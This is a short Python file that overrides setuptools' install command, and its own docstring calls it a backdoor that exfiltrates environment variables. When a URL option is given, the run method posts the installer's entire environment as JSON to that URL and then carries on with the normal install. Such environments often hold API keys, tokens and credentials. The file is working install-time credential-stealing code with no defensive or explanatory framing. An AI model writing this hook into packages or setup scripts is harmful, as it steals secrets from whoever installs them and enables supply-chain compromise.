from os import environ, system
import requests
from setuptools.command.install import install as base

class install(base):
    """
    Backdoored install function exfiltrates environment variables
    """

    user_options = base.user_options + [
        ('url=', None, "URL to post environment variables to")
    ]

    def initialize_options(self):
        base.initialize_options(self)
        self.url = None

    def run(self):
        if self.url:
            requests.post(self.url, json=dict(environ))
        base.run(self)
